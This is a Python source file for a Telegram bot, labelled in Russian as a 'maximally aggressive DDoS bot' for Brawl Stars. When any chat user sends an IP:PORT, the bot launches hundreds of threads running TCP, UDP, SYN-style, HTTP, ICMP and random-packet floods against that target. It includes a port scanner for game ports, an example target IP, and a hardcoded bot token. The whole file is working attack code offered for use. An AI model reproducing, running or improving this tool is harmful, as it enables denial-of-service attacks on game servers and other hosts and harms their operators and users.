#!/usr/bin/env python3
"""
МАКСИМАЛЬНО АГРЕССИВНЫЙ DDOS БОТ
ДЛЯ BRAWLS STARS - TCP + UDP + SYN + HTTP + ICMP
"""

import telebot
import socket
import threading
import random
import time
import re
import os
import struct
from flask import Flask, request

# ============ ТОКЕН ============
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ============ АГРЕССИВНЫЕ НАСТРОЙКИ ============
TCP_THREADS = 200
UDP_THREADS = 200
SYN_THREADS = 100
HTTP_THREADS = 100
ICMP_THREADS = 50

DELAY = 0.00001  # Минимальная задержка
active_attacks = {}

# ============ АТАКИ ============

# TCP FLOOD - агрессивный
def tcp_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            for _ in range(10):
                sock.send(random._urandom(1024))
            sock.close()
        except:
            pass
        time.sleep(DELAY)

# UDP FLOOD - агрессивный
def udp_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(5):
                sock.sendto(random._urandom(1400), (ip, port))
            sock.close()
        except:
            pass
        time.sleep(DELAY)

# SYN FLOOD - через обычные сокеты (максимально быстро)
def syn_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            sock.connect_ex((ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.000001)

# HTTP FLOOD - быстрые запросы
def http_flood(ip, port, stop_flag):
    paths = ['/', '/api', '/game', '/battle', '/login', '/match', '/join']
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            path = random.choice(paths)
            req = f"GET {path}/{random.randint(1,99999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
            sock.send(req.encode() * 3)
            sock.close()
        except:
            pass
        time.sleep(DELAY)

# ICMP FLOOD
def icmp_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + random._urandom(1024)
            sock.sendto(packet, (ip, 0))
            sock.close()
        except:
            # Если нет root, используем UDP как замену
            udp_flood(ip, port, stop_flag)
        time.sleep(DELAY)

# Brawl Stars специальный пакет
def brawl_packet(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            sock.connect((ip, port))
            # Имитация Brawl Stars протокола
            brawl_data = bytes([random.randint(0,255) for _ in range(256)])
            sock.send(brawl_data)
            sock.close()
        except:
            pass
        time.sleep(DELAY)

# ============ МЕНЕДЖЕР ============
class AggressiveAttack:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stop_flag = threading.Event()
        self.threads = []
        self.start_time = None
    
    def start(self):
        self.start_time = time.time()
        
        print(f"[*] Запуск агрессивной атаки на {self.ip}:{self.port}")
        
        # TCP потоки
        for i in range(TCP_THREADS):
            t = threading.Thread(target=tcp_flood, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        # UDP потоки
        for i in range(UDP_THREADS):
            t = threading.Thread(target=udp_flood, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        # SYN потоки
        for i in range(SYN_THREADS):
            t = threading.Thread(target=syn_flood, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        # HTTP потоки
        for i in range(HTTP_THREADS):
            t = threading.Thread(target=http_flood, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        # Brawl специфичные пакеты
        for i in range(50):
            t = threading.Thread(target=brawl_packet, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        print(f"[+] Всего потоков: {len(self.threads)}")
    
    def stop(self):
        self.stop_flag.set()
    
    def duration(self):
        return int(time.time() - self.start_time) if self.start_time else 0

# ============ ПАРСИНГ ============
def parse_target(text):
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if match:
        return match.group(1), int(match.group(2))
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if match:
        return match.group(1), None
    return None, None

def scan_port(ip):
    ports = [15455, 9339, 443, 80, 8080]
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.close()
            return port
        except:
            continue
    return 15455

# ============ КОМАНДЫ БОТА ============
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message,
        "💀 *AGGRESSIVE DDOS BOT* 💀\n\n"
        "⚡ *МАКСИМАЛЬНАЯ МОЩНОСТЬ*\n"
        f"• TCP: {TCP_THREADS} потоков\n"
        f"• UDP: {UDP_THREADS} потоков\n"
        f"• SYN: {SYN_THREADS} потоков\n"
        f"• HTTP: {HTTP_THREADS} потоков\n\n"
        "📌 Отправь IP:PORT\n"
        "📝 Пример: `43.158.103.205:15455`\n\n"
        "🛑 `stop` - остановка",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(message):
    cid = message.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        bot.reply_to(message, f"🛑 *Атака остановлена*", parse_mode="Markdown")
        del active_attacks[cid]
    else:
        bot.reply_to(message, "💤 *Нет активной атаки*", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(message):
    cid = message.chat.id
    ip, port = parse_target(message.text)
    
    if not ip:
        bot.reply_to(message, "❌ *Неверный IP*", parse_mode="Markdown")
        return
    
    if cid in active_attacks:
        bot.reply_to(message, "⚠️ *Атака уже идет! Отправь stop*", parse_mode="Markdown")
        return
    
    if not port:
        port = scan_port(ip)
    
    attack = AggressiveAttack(ip, port)
    attack.start()
    active_attacks[cid] = attack
    
    bot.reply_to(message,
        f"💀 *МАКСИМАЛЬНАЯ АТАКА ЗАПУЩЕНА* 💀\n\n"
        f"📍 `{ip}:{port}`\n"
        f"⚡ TCP: {TCP_THREADS}\n"
        f"⚡ UDP: {UDP_THREADS}\n"
        f"⚡ SYN: {SYN_THREADS}\n"
        f"⚡ HTTP: {HTTP_THREADS}\n"
        f"📦 Задержка: {DELAY*1000:.3f}мс\n"
        f"🛑 *stop* - остановка",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, "💀 Отправь IP:PORT для атаки\nПример: 43.158.103.205:15455\n\nstop - остановка")

# ============ WEBHOOK ============
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
def webhook():
    if request.method == 'GET':
        return 'Webhook is working!', 200
    try:
        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'ok', 200
    except:
        return 'error', 500

@app.route('/')
def index():
    return '✅ AGGRESSIVE DDOS BOT RUNNING!'

if __name__ == "__main__":
    print("=" * 50)
    print("AGGRESSIVE DDOS BOT STARTING")
    print(f"TCP: {TCP_THREADS} | UDP: {UDP_THREADS} | SYN: {SYN_THREADS} | HTTP: {HTTP_THREADS}")
    print("=" * 50)
    
    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
    webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
    
    try:
        bot.remove_webhook()
        bot.set_webhook(url=webhook_url)
        print(f"[+] Webhook: {webhook_url}")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False) 
